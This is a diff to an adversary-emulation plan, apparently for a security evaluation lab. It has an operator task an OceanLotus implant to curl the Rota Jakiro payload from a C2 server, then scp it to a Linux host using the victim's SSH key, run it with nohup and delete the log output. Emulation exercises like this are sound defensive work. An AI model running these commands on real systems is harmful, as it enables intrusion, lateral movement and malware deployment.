@@ -424,7 +424,7 @@ Execute Rota Jakiro
 
 1. Task OceanLotus to download Rota Jakiro to the macOS Host
    ```
-   ./evalsC2client.py --set-task <OSX.OceanLotus ID> '{"cmd":"OSX_download_file", "payload":"rota"}'
+   ./evalsC2client.py --set-task b6dbd70f203515095d0ca8a5ecbb43f7 '{"cmd":"OSX_download_file", "payload":"rota"}'
    ```
 
    Veify the file downloaded
@@ -432,30 +432,39 @@ Execute Rota Jakiro
    ```
    
    <details><summary>Trouble Shooting</summary>
-     On the C2 server:
-     ```
-     cd /opt/oceanlotus/Resources/payloads
-     python3 -m http.server
-     ```
-     Task the implant
-     ```
-     ./evalsC2client.py --set-task b6dbd70f203515095d0ca8a5ecbb43f7 '{"cmd":"OSX_run_cmd", "arg":"curl 10.90.30.26:8000/rota -o /tmp/rota"}'
-     ```
+     
+      On the C2 server start a simple HTTP server
+
+      ```
+      cd /opt/oceanlotus/Resources/payloads
+      python3 -m http.server
+      ```
+     
+      Task the implant
+      ```
+      ./evalsC2client.py --set-task b6dbd70f203515095d0ca8a5ecbb43f7 '{"cmd":"OSX_run_cmd", "arg":"curl 10.90.30.26:8000/rota -o /tmp/rota"}'
+      ```
      
      Veify the file downloaded
-     ```./evalsC2client.py --set-task b6dbd70f203515095d0ca8a5ecbb43f7 '{"cmd":"OSX_run_cmd", "arg":"ls -la /Users/hpotter/Library/WebKit/osx.download"}'
-     ```
+
+      ```
+      ./evalsC2client.py --set-task b6dbd70f203515095d0ca8a5ecbb43f7 '{"cmd":"OSX_run_cmd", "arg":"ls -la /tmp/rota"}'
+      ```
+     
    </details>
 
 1. Task OceanLotus to SCP the Rota Jakiro implant to the Linux host
    ```
-   ./evalsC2client.py --set-task b6dbd70f203515095d0ca8a5ecbb43f7 '{"cmd":"OSX_run_cmd", "arg":"scp -i /Users/hpotter/.ssh/id_rsa /tm
-   p/rota hpotter@viserion.com@10.90.30.7:/tmp/rota"}'
+   ./evalsC2client.py --set-task b6dbd70f203515095d0ca8a5ecbb43f7 '{"cmd":"OSX_run_cmd", "arg":"scp -i /Users/hpotter/.ssh/id_rsa /tmp/rota hpotter@viserion.com@10.90.30.7:/tmp/rota"}'
    ```
-
+1. Give Rota Jakiro executable permissions
+   ```
+   ./evalsC2client.py --set-task b6dbd70f203515095d0ca8a5ecbb43f7 '{"cmd":"OSX_run_cmd", "arg":"ssh -i /Users/hpotter/.ssh/id_rsa -t hpotter@viserion.com@10.90.30.7 \"chmod +x /tmp/rota\""}'
+   ```
+   
 1. Use OceanLotus to Execute Rota Jakiro on the Lotus host using ssh
    ```
-   ./evalsC2client.py --set-task b6dbd70f203515095d0ca8a5ecbb43f7 '{"cmd":"OSX_run_cmd", "arg":"ssh -i /Users/hpotter/.ssh/id_rsa -t hpotter@viserion.com@10.90.30.7 \"nohup /tmp/rota&; sleep 5; pkill rota\""}'
+   ./evalsC2client.py --set-task b6dbd70f203515095d0ca8a5ecbb43f7 '{"cmd":"OSX_run_cmd", "arg":"ssh -i /Users/hpotter/.ssh/id_rsa -t hpotter@viserion.com@10.90.30.7 \"nohup /tmp/rota&2>/dev/null; sleep 5; pkill rota;rm nohup.out\""}'                                         
    ```
 1. Confirm C2 Registration of Rota on the C2 Server
    Expected Output:
